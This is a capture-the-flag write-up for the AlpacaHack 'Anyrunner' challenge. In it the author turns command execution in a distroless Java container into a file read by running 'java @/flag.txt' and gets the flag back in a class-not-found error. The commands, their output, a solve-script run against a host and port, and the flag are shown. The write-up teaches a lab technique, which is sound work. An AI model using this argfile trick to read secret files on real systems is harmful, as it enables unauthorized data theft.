# [misc/pwn] Anyrunner

> You have arbitrary command execution but a distroless image with nothing to run — so make the `java` launcher itself leak the file via an @argfile.

## Overview

| Item | Value |
|------|-------|
| Platform | AlpacaHack |
| Event | Daily Challenge |
| Category | misc (jail / living-off-the-land) |
| Difficulty | ★★★☆☆ |
| Date | 2026-11-03 |
| Flag | `Alpaca{wowwowmeowmeow}` |

## Problem Statement

> distroless -- a world where even cat does not exist.
>
> `anyrunner.tar.gz`

Remote TCP service; source provided (`Server.java`, `Dockerfile`, `compose.yaml`).

## TL;DR

- `Server.java` reads one line and runs it with `ProcessBuilder(line.split("\\s+"))` — arbitrary command execution, **but no shell** and args are whitespace-split (no pipes/redirection).
- The runtime is `gcr.io/distroless/java25-debian13` (non-debug): no `cat`, no coreutils, no shell. The only executable is `/usr/bin/java`, and even `jdk.compiler` is absent (so the single-file source launcher fails).
- The `java` launcher reads `@argfile`s: `java @/flag.txt` expands the flag file onto the command line. The flag (no spaces) is parsed as a main-class name and echoed back: `Error: Could not find or load main class Alpaca{...}`.

## Background Knowledge

### Distroless images

Distroless images contain only an application and its runtime — no package manager, no shell, no `/bin/cat`. Here the final stage ships just the Temurin JDK runtime. That defeats the usual "RCE → `cat /flag`" because there is nothing to exec except `java`.

### The `java` launcher's @argfile feature

Since JDK 9, the `java` launcher supports *argument files*: `java @path` reads `path` and splits its contents (on whitespace, with quoting rules) into launcher arguments, as if typed on the command line. This needs only `java.base` — no compiler, no extra tools.

If the file's content has no spaces, it becomes a single token. The launcher treats the first non-option token as the **main class name**; when that class can't be found it prints the name verbatim in the error — a reliable read primitive for single-token files.

## Solution

### Step 1: Recon the service and image

`Server.java` → one command per connection, `ProcessBuilder` with `redirectErrorStream(true)`, streams stdout+stderr back. `Dockerfile` → final image is distroless java25 (no debug shell), flag at `/flag.txt`.

### Step 2: Confirm the environment

```
$ java --version
openjdk 25.0.3 2026-04-21 LTS ...
```

`java` runs. The source-launcher idea fails:

```
$ java --source 25 /flag.txt
java.lang.InternalError: Module jdk.compiler not in boot Layer
```

So only `java.base` is usable.

### Step 3: Leak the flag with an @argfile

```
$ java @/flag.txt
Error: Could not find or load main class Alpaca{wowwowmeowmeow}
Caused by: java.lang.ClassNotFoundException: Alpaca{wowwowmeowmeow}
```

The flag is echoed as the (missing) main-class name. Script: [`solve.py`](solve.py).

```bash
$ python3 solve.py 34.170.146.252 46342
Alpaca{wowwowmeowmeow}
```

## Tools Used

| Tool | Purpose |
|------|---------|
| Python stdlib `socket` | Drive the one-shot command service |
| The target's own `java` | @argfile read primitive |

## Lessons Learned

### What I Learned
- "Living off the land" in a distroless box: when only `java` exists, its launcher features (`@argfile`, single-file source mode) become file-read / code-exec primitives.
- `@argfile` works with just `java.base`; the single-file source launcher does not (it needs `jdk.compiler`, often stripped from runtime images).
- A failed main-class lookup echoes the class name — a tidy exfil channel for space-free content like a flag.

### Mistakes Made
- First tried `java --source 25 /flag.txt` (compiler-based source launcher); it failed because `jdk.compiler` isn't in the runtime boot layer. Pivoted to `@argfile`.

## References

- JEP 330 / `java` launcher docs — single-file source programs and `@argument-files`.

## Tags

`misc` `jail` `distroless` `java` `argfile` `lolbin` `rce`
